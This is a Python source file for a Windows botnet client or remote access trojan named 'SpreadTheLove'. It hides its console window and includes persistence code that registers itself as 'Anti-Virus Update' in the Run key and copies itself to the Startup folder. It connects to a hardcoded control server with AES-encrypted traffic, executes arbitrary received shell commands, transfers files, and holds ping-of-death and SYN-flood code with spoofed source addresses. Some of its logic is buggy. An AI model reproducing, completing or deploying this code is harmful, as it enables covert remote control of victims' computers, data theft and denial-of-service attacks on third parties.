# from scapy.all import *
import os
import time
import base64
import shutil
import socket
import random
import win32api
import platform
import win32con
import win32gui
import threading
import subprocess
import win32console
from _winreg import *
from Queue import Queue
from Crypto.Cipher import AES

s = socket.socket()

NUMBER_OF_THREADS = 3
JOB_NUMBER = [1, 2, 3, ]
queue = Queue()

connected = False

BS = 32


class Startup:
    def __init__(self):
        self.user = win32api.GetUserName()  # Username
        self.reg_exist = True
        self.file_name = "SpreadTheLove.py"

    def hide(self):
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

    def add_to_registry(self):  # add to startup registry  # add to startup registry
        hkey = win32api.RegCreateKey(win32con.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
        win32api.RegSetValueEx(hkey, 'Anti-Virus Update', 0, win32con.REG_SZ, (os.getcwd() + __file__))
        win32api.RegCloseKey(hkey)

    def add_to_startup(self):
        path = 'C:\\Users\\' + self.user + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
        if os.path.isfile(path + self.file_name) == True:
            pass
        else:
            shutil.copy(os.getcwd() + '\\' + self.file_name, path)


class Encrypt:
    def encrypt(self, key, raw):
        pad = lambda x: x + (BS - len(x) % BS) * chr(BS - len(x) % BS)
        raw = pad(raw)
        iv = "q9%*LJZs<5:f]ngq"
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw))

    def decrypt(self, key, enc):
        unpad = lambda x: x[0:-ord(x[-1])]
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc[16:]))

"""
class DenialOfService:
    def ping_of_death(self, target):
        src = "%i.%i.%i.%i" % (
            random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        ip_hdr = IP(src, target)
        _packet = ip_hdr / ICMP() / (str(os.urandom(65500)))
        send(_packet)

    def syn_flood(self, target, port):
        i = IP()
        i.src = "%i.%i.%i.%i" % (random.randint(1, 254), random.randint(1, 254), random.randint(1, 254), random.randint(1, 254))
        i.dst = target
        t = TCP()
        t.sport = random.randint(1, 65500)
        t.dport = port
        t.flags = 'S'
        send(i / t, verbose=0)
"""

class DenialOfService:
    pass


class FileHandler:
    def __init__(self):
        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'

    def upload(self, filename):
        f = open(filename, 'rb')
        Bot().send(filename)
        l = f.read(1024)
        while (l):
            s.send(l)
        f.close()
        return None

    def download(self, filename):
        with open('received_file.txt', 'wb') as f:
            print 'file opened'
            while True:
                print 'receiving data...'
                data = Bot().receive()
                print 'data: ' + data
                print data
                f.write(data)
                break
        f.close()
        return None


class Spread:
    pass


class Bot:
    def __init__(self):
        self.ip = '127.0.0.1'  # IP of Host
        self.port = 44353  # Host's port
        self.key = '{\xb9\xfed\xfc\x83\xcf\x1a:\xbe\xa7%\x0c\xa3\x88\xa8N\x7f\x89\xcd\xdf\x81\xb7\x98\xf8\x87\xdf\xab\xc5]}\xb8'  # key used for encryption
        self.connected = False

    def connect(self):
        if connected == False:
            try:
                s.connect((self.ip, self.port))
                self.connected = True
            except socket.error:
                time.sleep(2.5)
                pass
        else:
            pass

    def send(self, data):
        data = Encrypt().encrypt(self.key, data)
        try:
            s.send(data)
        except socket.error:
            self.connected = False

    def receive(self):
        global connected
        try:
            data = s.recv(2048)
            if not data:
                connected = False
                pass
            else:
                data = Encrypt().decrypt(self.key, str(data))
                return data
        except socket.error:
            connected = False

    def exec_command(self, command):
        command = command.split(' ')
        if command[0] == 'cd':
            os.chdir(command[1])
            self.send(os.getcwd())
        if command[0] == 'info':
            info = platform.uname()
            self.send('OS: %s\nHost Name: %s' % (info[2], info[1]))
        if command[0] == 'exit':
            s.close()
            self.connect()
        if command[0] == 'DDoS':
            if command[1] == 'pod':
                ThreadHandler().add_to_threads(DenialOfService().ping_of_death, command[2])
                self.send('Started DoS!')
            if command[1] == 'stop':
                # ThreadHandler().stop()
                pass
        else:
            data = ' '.join(command)
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            self.send(output)

    def handler(self):
        while True:
            data = self.receive()
            data.split(' ')
            if data[0] == 'ok?':
                self.send('ok!')
            if data[0] == 'download':
                if len(data[1]) > 0:
                    FileHandler().upload(data[1])
                else:
                    pass
            if data[0] == 'upload':
                if len(data[1]) > 0:
                    FileHandler().download(data[1])
                else:
                    pass
            else:
                self.exec_command(data)

    def run(self):
        self.connect()
        self.handler()


class ThreadHandler:
    def stop(self, thread_num):
        threading.thread.exit()

    def add_to_threads(self, target, args):
        t = threading.Thread(target=target, args=args)
        t.daemon = True
        print "started thread"
        t.start()

    def create_workers(self):
        for _ in range(NUMBER_OF_THREADS):
            stop_event = threading.Event()
            t = threading.Thread(target=self.work)
            t.daemon = True
            t.start()

    def work(self):
        while True:
            x = queue.get()
            if x == 1:
                Startup().hide()
                # Startup().add_to_registry()
                # Startup().add_to_startup()
                Bot().run()
            if x == 2:
                pass
            queue.task_done()

    def create_jobs(self):
        for x in JOB_NUMBER:
            queue.put(x)
        queue.join()

    def run(self):
        self.create_workers()
        self.create_jobs()


if __name__ == '__main__':
    ThreadHandler().run()
